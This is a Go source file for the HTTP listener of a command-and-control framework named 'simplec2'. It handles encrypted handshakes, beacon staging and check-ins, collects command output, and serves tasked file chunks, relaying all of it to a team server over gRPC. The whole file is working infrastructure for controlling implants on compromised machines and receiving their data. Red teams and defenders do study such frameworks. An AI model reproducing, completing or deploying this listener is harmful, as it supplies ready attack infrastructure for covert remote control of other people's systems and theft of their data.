package main

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"sync"
	"time"

	"simplec2/listeners/common"
	"simplec2/pkg/bridge"
	"simplec2/pkg/config"
	"simplec2/pkg/pki"

	"github.com/google/uuid"
	"gopkg.in/yaml.v3"
)

var (
	cfg         config.ListenerConfig
	privateKey  *rsa.PrivateKey
	sessionKeys sync.Map // Thread-safe map: sessionID -> sessionKey

	// HTTP Server state
	httpServer *http.Server
	serverMu   sync.Mutex
)

func main() {
	configPath := flag.String("config", "listener.yaml", "Path to the Listener configuration file.")
	flag.Parse()

	if _, err := os.Stat(*configPath); os.IsNotExist(err) {
		log.Printf("Configuration file not found. Generating a default one at '%s'", *configPath)
		if err := generateDefaultConfig(*configPath); err != nil {
			log.Fatalf("Failed to generate default config: %v", err)
		}
		log.Println("Please review and edit the new configuration file, then restart the listener.")
		return
	}

	if err := config.LoadConfig(*configPath, &cfg); err != nil {
		log.Fatalf("Failed to load configuration: %v", err)
	}

	conn, err := common.ConnectToTeamServer(&cfg)
	if err != nil {
		log.Fatalf(err.Error())
	}
	defer conn.Close()

	loadPrivateKey()

	// Construct config JSON for registration
	configJSON, _ := json.Marshal(map[string]interface{}{
		"port": cfg.Listener.Port,
	})

	// Start the control channel
	common.StartControlChannel(&cfg, "HTTP", string(configJSON), handleTeamServerCommand)

	// Start the HTTP server initially
	startServer()

	// Block forever, allowing the control channel and server goroutine to run
	select {}
}

func handleTeamServerCommand(cmd *bridge.ListenerCommand) {
	log.Printf("Received command from TeamServer: Action=%s", cmd.Action)

	switch cmd.Action {
	case bridge.ListenerCommand_START:
		startServer()
	case bridge.ListenerCommand_STOP:
		stopServer()
	case bridge.ListenerCommand_RESTART:
		stopServer()
		// Give it a moment to release the port
		time.Sleep(1 * time.Second)
		startServer()
	case bridge.ListenerCommand_EXIT:
		log.Println("Received EXIT command. Shutting down listener process...")
		stopServer()
		os.Exit(0)
	case bridge.ListenerCommand_UPDATE_CONFIG:
		log.Println("Config update not fully implemented yet.")
	}
}

func startServer() {
	serverMu.Lock()
	defer serverMu.Unlock()

	if httpServer != nil {
		log.Println("Server is already running.")
		return
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/handshake", handshakeHandler)
	mux.HandleFunc("/stage", stageHandler)
	mux.HandleFunc("/checkin", checkinHandler)
	mux.HandleFunc("/output", outputHandler)
	mux.HandleFunc("/chunk", chunkHandler)

	httpServer = &http.Server{
		Addr:    cfg.Listener.Port,
		Handler: mux,
	}

	go func() {
		log.Printf("HTTP Listener starting on port %s", cfg.Listener.Port)
		if err := httpServer.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Printf("HTTP Listener failed: %v", err)
			// Ensure state is cleared if start fails
			serverMu.Lock()
			httpServer = nil
			serverMu.Unlock()
		}
	}()
}

func stopServer() {
	serverMu.Lock()
	defer serverMu.Unlock()

	if httpServer == nil {
		log.Println("Server is not running.")
		return
	}

	log.Println("Stopping HTTP Listener...")
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	if err := httpServer.Shutdown(ctx); err != nil {
		log.Printf("Error shutting down server: %v", err)
	}
	httpServer = nil
	log.Println("HTTP Listener stopped.")
}

func generateDefaultConfig(path string) error {
	defaultConfig := config.ListenerConfig{
		TeamServer: struct {
			Host string `yaml:"host"`
			Port string `yaml:"port"`
		}{
			Host: "localhost",
			Port: ":50052",
		},
		Listener: struct {
			Name string `yaml:"name"`
			Port string `yaml:"port"`
		}{
			Name: "http-default",
			Port: ":8888",
		},
		Auth: struct {
			APIKey           string `yaml:"api_key,omitempty"`
			EncryptedAPIKey  *config.EncryptedAPIKey `yaml:"encrypted_api_key,omitempty"`
		}{
			APIKey: "SimpleC2ListenerAPIKey_CHANGE_ME",
		},
		Certs: struct {
			ClientCert string `yaml:"client_cert"`
			ClientKey  string `yaml:"client_key"`
			CACert     string `yaml:"ca_cert"`
			PrivateKey string `yaml:"private_key"`
		}{
			ClientCert: "./certs/client.crt",
			ClientKey:  "./certs/client.key",
			CACert:     "./certs/ca.crt",
			PrivateKey: "./certs/listener_rsa.key",
		},
	}

	data, err := yaml.Marshal(&defaultConfig)
	if err != nil {
		return err
	}

	return os.WriteFile(path, data, 0644)
}

func loadPrivateKey() {
	// First, check if RSA private key exists. If not, generate.
	rsaPrivateKeyPath := cfg.Certs.PrivateKey
	rsaPublicKeyPath := filepath.Join(filepath.Dir(rsaPrivateKeyPath), "listener.pub")

	if _, err := os.Stat(rsaPrivateKeyPath); os.IsNotExist(err) {
		log.Println("RSA private key not found. Generating new RSA key pair for E2E encryption...")
		privPEM, pubPEM, genErr := pki.GenerateRSAKeyPair()
		if genErr != nil {
			log.Fatalf("Failed to generate RSA key pair: %v", genErr)
		}

		if err := os.MkdirAll(filepath.Dir(rsaPrivateKeyPath), 0755); err != nil {
			log.Fatalf("Failed to create certs directory: %v", err)
		}
		if err := pki.SavePEMFile(rsaPrivateKeyPath, privPEM, 0600); err != nil {
			log.Fatalf("Failed to save RSA private key: %v", err)
		}
		if err := pki.SavePEMFile(rsaPublicKeyPath, pubPEM, 0644); err != nil {
			log.Fatalf("Failed to save RSA public key: %v", err)
		}
		log.Println("Generated and saved new RSA key pair.")
	}

	// Now load the private key (either newly generated or existing)
	keyData, err := os.ReadFile(rsaPrivateKeyPath)
	if err != nil {
		log.Fatalf("Failed to read RSA private key file: %v", err)
	}
	block, _ := pem.Decode(keyData)
	if block == nil {
		log.Fatal("Failed to decode PEM block containing RSA private key")
	}
	privateKey, err = x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		log.Fatalf("Failed to parse RSA private key: %v", err)
	}
	log.Println("Successfully loaded RSA private key.")
}

func handshakeHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}

	encryptedSessionKey, err := io.ReadAll(r.Body)
	if err != nil {
		log.Printf("HANDSHAKE ERROR: Failed to read request body: %v", err)
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	sessionKey, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, privateKey, encryptedSessionKey, nil)
	if err != nil {
		log.Printf("HANDSHAKE ERROR: Failed to decrypt session key: %v", err)
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	sessionID := uuid.New().String()
	sessionKeys.Store(sessionID, sessionKey)

	log.Printf("Successful handshake. New SessionID: %s", sessionID)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"session_id": sessionID})
}

func stageHandler(w http.ResponseWriter, r *http.Request) {
	encryptedBody, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read body", http.StatusBadRequest)
		return
	}

	decryptedBody, err := decryptRequest(r, encryptedBody)
	if err != nil {
		http.Error(w, err.Error(), http.StatusUnauthorized)
		return
	}

	// DEBUG LOGGING
	log.Printf("DEBUG: Staging Decrypted Body: %s", string(decryptedBody))

	var agentReq bridge.StageBeaconRequest
	if err := json.Unmarshal(decryptedBody, &agentReq); err != nil {
		log.Printf("DEBUG: JSON Unmarshal error: %v", err)
		http.Error(w, "Invalid staging request format", http.StatusBadRequest)
		return
	}
	
	// DEBUG LOGGING
	log.Printf("DEBUG: Unmarshaled Metadata: %+v", agentReq.Metadata)

	ctx, cancel := common.CreateAuthenticatedContext(&cfg)
	defer cancel()

	// Use metadata from agent, but override ListenerName with our own config
	grpcReq := &bridge.StageBeaconRequest{
		ListenerName: cfg.Listener.Name, 
		Metadata:     agentReq.Metadata,
		// We could also pass remote address from HTTP request here if we wanted
		RemoteAddr: r.RemoteAddr,
		Timestamp: agentReq.Timestamp,
	}
	
	grpcRes, err := common.TSClient.StageBeacon(ctx, grpcReq)
	if err != nil {
		log.Printf("gRPC StageBeacon failed: %v", err)
		http.Error(w, "Failed to stage beacon with TeamServer", http.StatusInternalServerError)
		return
	}

	responseMap := map[string]string{
		"assigned_beacon_id": grpcRes.GetAssignedBeaconId(),
	}

	encryptAndSend(w, r, responseMap)
}

func checkinHandler(w http.ResponseWriter, r *http.Request) {
	encryptedBody, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read body", http.StatusBadRequest)
		return
	}

	decryptedBody, err := decryptRequest(r, encryptedBody)
	if err != nil {
		http.Error(w, err.Error(), http.StatusUnauthorized)
		return
	}

	var req struct {
		BeaconID string `json:"beacon_id"`
	}
	if err := json.Unmarshal(decryptedBody, &req); err != nil {
		http.Error(w, "Invalid checkin format", http.StatusBadRequest)
		return
	}

	ctx, cancel := common.CreateAuthenticatedContext(&cfg)
	defer cancel()

	grpcRes, err := common.TSClient.CheckInBeacon(ctx, &bridge.CheckInBeaconRequest{BeaconId: req.BeaconID, ListenerName: cfg.Listener.Name})
	if err != nil {
		if common.IsNotFound(err) {
			http.Error(w, "Beacon not found", http.StatusNotFound)
		} else {
			log.Printf("gRPC CheckInBeacon failed: %v", err)
			http.Error(w, "Check-in failed", http.StatusInternalServerError)
		}
		return
	}

	encryptAndSend(w, r, grpcRes)
}

func outputHandler(w http.ResponseWriter, r *http.Request) {
	encryptedBody, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read body", http.StatusBadRequest)
		return
	}

	decryptedBody, err := decryptRequest(r, encryptedBody)
	if err != nil {
		http.Error(w, err.Error(), http.StatusUnauthorized)
		return
	}

	var req bridge.PushBeaconOutputRequest
	if err := json.Unmarshal(decryptedBody, &req); err != nil {
		http.Error(w, "Invalid output format", http.StatusBadRequest)
		return
	}

	ctx, cancel := common.CreateAuthenticatedContext(&cfg)
	defer cancel()

	_, err = common.TSClient.PushBeaconOutput(ctx, &req)
	if err != nil {
		log.Printf("gRPC PushBeaconOutput failed: %v", err)
		http.Error(w, "Failed to push output", http.StatusInternalServerError)
		return
	}

	encryptAndSend(w, r, map[string]string{"status": "ok"})
}

func chunkHandler(w http.ResponseWriter, r *http.Request) {
	encryptedBody, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read body", http.StatusBadRequest)
		return
	}

	decryptedBody, err := decryptRequest(r, encryptedBody)
	if err != nil {
		http.Error(w, err.Error(), http.StatusUnauthorized)
		return
	}

	var req struct {
		TaskID      string `json:"task_id"`
		ChunkNumber int32  `json:"chunk_number"`
	}
	if err := json.Unmarshal(decryptedBody, &req); err != nil {
		http.Error(w, "Invalid chunk request format", http.StatusBadRequest)
		return
	}

	ctx, cancel := common.CreateAuthenticatedContext(&cfg)
	defer cancel()

	grpcReq := &bridge.GetTaskedFileChunkRequest{
		TaskId:      req.TaskID,
		ChunkNumber: req.ChunkNumber,
	}

	grpcRes, err := common.TSClient.GetTaskedFileChunk(ctx, grpcReq)
	if err != nil {
		log.Printf("gRPC GetTaskedFileChunk failed: %v", err)
		http.Error(w, "Failed to get file chunk", http.StatusInternalServerError)
		return
	}

	encryptAndSendRaw(w, r, grpcRes.GetChunkData())
}


func decryptRequest(r *http.Request, encryptedBody []byte) ([]byte, error) {
	sessionID := r.Header.Get("X-Session-ID")
	if sessionID == "" {
		return nil, fmt.Errorf("missing X-Session-ID header")
	}

	key, ok := sessionKeys.Load(sessionID)
	if !ok {
		return nil, fmt.Errorf("invalid session ID")
	}

	return decrypt(encryptedBody, key.([]byte))
}

func encryptAndSend(w http.ResponseWriter, r *http.Request, data interface{}) {
	plaintext, err := json.Marshal(data)
	if err != nil {
		http.Error(w, "Failed to marshal response", http.StatusInternalServerError)
		return
	}

	encryptAndSendRaw(w, r, plaintext)
}

func encryptAndSendRaw(w http.ResponseWriter, r *http.Request, plaintext []byte) {
	sessionID := r.Header.Get("X-Session-ID")
	key, ok := sessionKeys.Load(sessionID)
	if !ok {
		http.Error(w, "Invalid session ID for response", http.StatusUnauthorized)
		return
	}

	encryptedResponse, err := encrypt(plaintext, key.([]byte))
	if err != nil {
		http.Error(w, "Failed to encrypt response", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(encryptedResponse)
}


func encrypt(plaintext []byte, key []byte) ([]byte, error) {
	c, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(c)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func decrypt(ciphertext []byte, key []byte) ([]byte, error) {
	c, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(c)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}